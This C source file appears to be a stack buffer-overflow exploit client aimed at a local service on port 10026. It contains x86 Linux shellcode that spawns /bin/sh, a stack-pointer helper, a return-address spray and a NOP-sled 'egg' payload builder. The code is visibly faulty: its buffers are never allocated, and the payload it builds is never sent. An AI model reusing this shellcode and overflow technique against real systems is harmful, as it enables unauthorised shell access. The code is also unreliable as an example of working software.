#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}
int main(int argc, char** argv)
{
	char *buff, *ptr, *egg;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i, eggsize=DEFAULT_EGG_SIZE;
	int sockfd;
	int len;
	struct sockaddr_in address;
	int result;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = inet_addr("127.0.0.1");
	address.sin_port = htons(10026);
	len = sizeof(address);
	result = connect(sockfd, (struct sockaddr *)&address, len);


  addr = get_esp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;

  addr_ptr = (long *) ptr;

  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;
printf("123\n");
  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

	if(result == -1) {
		perror("oops: client");
		exit(1);
	}
	char buf2[512];
	write(sockfd, "123", 4);
	read(sockfd, buf2, sizeof buf2);
	if (!strcmp(buf2, "NO"))
	{
		printf("goodby\n");
		return 0;
	}
	for (i = 0; i < 512; i++)
		buf2[i] = 1;
	write(sockfd, buf2, 512);
	read(sockfd, buf2, sizeof buf2);
	printf("leaving...\n");
	close(sockfd);
	exit(0);
}

